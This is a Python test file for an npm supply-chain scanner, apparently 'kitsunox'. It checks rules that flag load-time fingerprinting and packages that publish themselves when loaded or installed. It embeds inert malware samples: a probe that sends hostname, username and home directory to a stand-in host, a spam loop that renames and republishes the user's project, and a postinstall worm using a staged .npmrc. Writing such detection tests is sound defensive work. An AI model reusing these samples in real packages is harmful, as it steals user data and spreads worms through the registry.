"""`npm.load-fingerprint` and `npm.publish-at-load` on hand-written, inert trees (parsed,
never run)."""

import json

import pytest

from kitsunox.core.models import PackageVersionRef, PublishInfo, Severity, VersionSnapshot
from kitsunox.ecosystems.npm.entry import load_sources
from kitsunox.ecosystems.npm.install import install_sources
from kitsunox.ecosystems.npm.rules.load_time import (
    LoadFingerprint,
    PublishAtLoad,
    bin_files,
    fingerprints,
)
from kitsunox.stages.ast import CapabilityCache, CodeChange, code_change

CACHE = CapabilityCache(None)
RULE = LoadFingerprint()
PROBE = b"""const os = require("os");
const https = require("https");
const data = JSON.stringify({ h: os.hostname(), u: os.userInfo().username, d: os.homedir() });
const req = https.request({ hostname: "collector.invalid", method: "POST" });
req.write(data);
req.end();
"""
LIBRARY = b"""const os = require("os");
const https = require("https");
function describe() { return { h: os.hostname(), u: os.userInfo().username }; }
function send(body) { return https.request({ hostname: "api.invalid" }).end(body); }
module.exports = { describe, send };
"""


def change(
    files: dict[str, bytes], before: dict[str, bytes] | None = None, manifest: object = None
) -> CodeChange:
    snapshot = VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version="1.0.1"),
        publish=PublishInfo(),
        manifest={"name": "kx", "main": "index.js"} if manifest is None else manifest,
    )
    tree = {"package.json": json.dumps(snapshot.manifest).encode(), **files}
    base = None if before is None else {"package.json": b'{"main": "index.js"}', **before}
    return code_change(
        snapshot, tree, base, CACHE, None, "1.0.0" if before else None, load_entries=load_sources
    )


def test_the_load_time_probe_is_medium() -> None:
    (finding,) = RULE.evaluate_code(change({"index.js": PROBE}))
    assert (finding.severity, finding.weight) == (Severity.MEDIUM, 3.0)
    assert "`homedir()`, `hostname()`, `userInfo()`" in finding.explanation
    assert [(e.path, e.line_start) for e in finding.evidence] == [("index.js", 3)] * 3 + [
        ("index.js", 2)  # the network use
    ]


def test_a_file_the_entry_imports_counts() -> None:
    """`archetype-index-sdk@1.0.0`: the entry imports the file that collects and sends."""
    files = {
        "index.js": b'import "./telemetry-info.mjs";\nexport const x = 1;',
        "telemetry-info.mjs": b"""import os from "node:os";
async function main() { const facts = { host: os.hostname(), user: os.userInfo() };
  const https = await import("node:https"); https.request("https://c.invalid").end(); }
main().catch(() => {});
""",
    }
    (finding,) = RULE.evaluate_code(change(files))
    assert "`telemetry-info.mjs`" in finding.explanation


def test_what_does_not_fire() -> None:
    assert RULE.evaluate_code(change({"index.js": LIBRARY})) == ()  # functions not called
    no_network = PROBE.replace(b"https.request", b"console.log").replace(b'require("https")', b"0")
    assert RULE.evaluate_code(change({"index.js": no_network})) == ()
    one_fact = b'const os = require("os"); require("https"); const p = os.homedir() + "/.cfg";'
    assert RULE.evaluate_code(change({"index.js": one_fact})) == ()
    # not loaded: a bin script, a test, a file no entry reaches
    manifest = {"name": "kx", "main": "index.js", "bin": {"kx": "cli.js"}}
    files = {"index.js": b"module.exports = 1;", "cli.js": PROBE, "test/probe.test.js": PROBE}
    assert RULE.evaluate_code(change(files, manifest=manifest)) == ()


def test_the_reads_must_be_in_one_file() -> None:
    files = {
        "index.js": b'require("./a"); require("./b"); require("https");',
        "a.js": b'module.exports = require("os").hostname();',
        "b.js": b'module.exports = require("os").userInfo();',
    }
    assert RULE.evaluate_code(change(files)) == ()
    assert set(fingerprints(change({"index.js": PROBE}).after)) == {"index.js"}


def test_on_updates_only_when_the_previous_version_did_not() -> None:
    assert RULE.evaluate_code(change({"index.js": PROBE}, before={"index.js": PROBE})) == ()
    (finding,) = RULE.evaluate_code(change({"index.js": PROBE}, before={"index.js": LIBRARY}))
    assert finding.rule_id == "npm.load-fingerprint"


def test_without_a_load_profile_nothing_fires() -> None:
    assert RULE.evaluate_code(change({"lib/x.js": PROBE}, manifest={"name": "kx"})) == ()


def test_a_bin_target_does_not_count() -> None:
    """A CLI whose `main` is its `bin` runs the program when required (`codeam-cli`)."""
    for listed in ("./index.js", {"kx": "index.js"}):
        manifest = {"name": "kx", "main": "index.js", "bin": listed}
        assert RULE.evaluate_code(change({"index.js": PROBE}, manifest=manifest)) == ()
    manifest = {"name": "kx", "main": "index.js", "bin": {"kx": "bin/cli.js"}}
    assert len(RULE.evaluate_code(change({"index.js": PROBE}, manifest=manifest))) == 1
    assert bin_files({"bin": ["not", "a", "map"]}) == frozenset()
    assert bin_files({"bin": {"a": "./bin/../cli.js", "b": 3}}) == {"cli.js"}


# npm.publish-at-load: the `*_z3n` spam's `main` (shortened): a loop started at load that
# renames the user's project and publishes it.
SPAM = b"""const fs = require("fs");
const { exec } = require("child_process");
function rename() {
  setTimeout(() => {
    const pkg = JSON.parse(fs.readFileSync("package.json"));
    pkg.name = "random_" + Date.now();
    fs.writeFileSync("package.json", JSON.stringify(pkg));
    publishWithDelay();
  }, 10000);
}
function publishWithDelay() {
  exec("npm publish --access public", () => setTimeout(rename, 1000));
}
rename();
"""
# A release tool: the same kind of command, run only when its user calls `release()`.
RELEASER = b"""const { execSync } = require("child_process");
function release(tag) { execSync(`npm publish --tag ${tag}`, { stdio: "inherit" }); }
module.exports = { release };
"""
PUBLISH = PublishAtLoad()


def install_change(
    files: dict[str, bytes], manifest: dict[str, object], before: dict[str, bytes] | None = None
) -> CodeChange:
    snapshot = VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version="1.0.1"),
        publish=PublishInfo(),
        manifest=manifest,
    )
    tree = {"package.json": json.dumps(manifest).encode(), **files}
    base = None if before is None else {"package.json": json.dumps(manifest).encode(), **before}
    return code_change(
        snapshot,
        tree,
        base,
        CACHE,
        install_sources,
        "1.0.0" if before else None,
        load_entries=load_sources,
    )


def test_spam_that_publishes_when_loaded_is_medium() -> None:
    (finding,) = PUBLISH.evaluate_code(change({"index.js": SPAM}))
    assert (finding.rule_id, finding.severity, finding.weight) == (
        "npm.publish-at-load",
        Severity.MEDIUM,
        3.0,
    )
    assert "When the package is loaded," in finding.explanation
    assert [(e.path, e.line_start) for e in finding.evidence] == [("index.js", 12)]
    assert 'exec("npm publish --access public"' in (finding.evidence[0].snippet or "")


def test_a_worm_that_publishes_from_postinstall() -> None:
    """`@emilgroup/*`: `postinstall: node index.js` runs a publish through a wrapper of
    `execSync`, in a file the hook's script loads."""
    deploy = b"""const { execSync } = require("child_process");
function run(cmd) { return execSync(cmd, { stdio: "inherit" }); }
const rc = "/tmp/x/.npmrc";
run(`npm publish --userconfig=${rc} --access public`);
"""
    manifest: dict[str, object] = {
        "name": "kx",
        "main": "lib.js",
        "scripts": {"postinstall": "node setup.js"},
    }
    files = {"lib.js": b"module.exports = 1;", "setup.js": b'require("./deploy.js");'}
    (finding,) = PUBLISH.evaluate_code(install_change({**files, "deploy.js": deploy}, manifest))
    assert "When the package is installed," in finding.explanation
    assert [(e.path, e.line_start) for e in finding.evidence] == [("deploy.js", 4)]
    both = {**manifest, "main": "setup.js"}
    (finding,) = PUBLISH.evaluate_code(install_change({**files, "deploy.js": deploy}, both))
    assert "loaded and installed" in finding.explanation
    assert len(finding.evidence) == 1  # one command, reached both ways


@pytest.mark.parametrize(
    "command",
    [
        b'exec("pnpm publish --no-git-checks")',
        b'execSync("yarn npm publish")',
        b'spawn("npm", ["publish", "--access", "public"])',
        b'execSync("cd /tmp/pkg && npm --registry=https://r.invalid publish")',
        b'const CMD = "bun publish";\nexecSync(CMD);',
    ],
)
def test_the_publishing_commands(command: bytes) -> None:
    source = b'const { exec, execSync, spawn } = require("child_process");\n' + command
    assert len(PUBLISH.evaluate_code(change({"index.js": source}))) == 1


def test_what_does_not_publish_at_load() -> None:
    assert PUBLISH.evaluate_code(change({"index.js": RELEASER})) == ()  # only when called
    printed = b'console.log("Done. Now run: npm publish --access public");'
    assert PUBLISH.evaluate_code(change({"index.js": printed})) == ()  # text, not a command
    script = b'require("child_process").execSync("npm run publish");'  # a script named publish
    assert PUBLISH.evaluate_code(change({"index.js": script})) == ()
    # a release script that `scripts` names (not an install hook) is neither loaded nor installed
    manifest: dict[str, object] = {
        "name": "kx",
        "main": "index.js",
        "scripts": {"release": "node release.js"},
    }
    files = {"index.js": b"module.exports = 1;", "release.js": SPAM}
    assert PUBLISH.evaluate_code(install_change(files, manifest)) == ()
    # nor counts a `bin` target, even when `main` points at it
    manifest = {"name": "kx", "main": "cli.js", "bin": {"kx": "cli.js"}}
    assert PUBLISH.evaluate_code(change({"cli.js": SPAM}, manifest=manifest)) == ()


def test_publish_at_load_on_updates_only_when_new() -> None:
    assert PUBLISH.evaluate_code(change({"index.js": SPAM}, before={"index.js": SPAM})) == ()
    gained = change({"index.js": SPAM}, before={"index.js": RELEASER})
    assert len(PUBLISH.evaluate_code(gained)) == 1
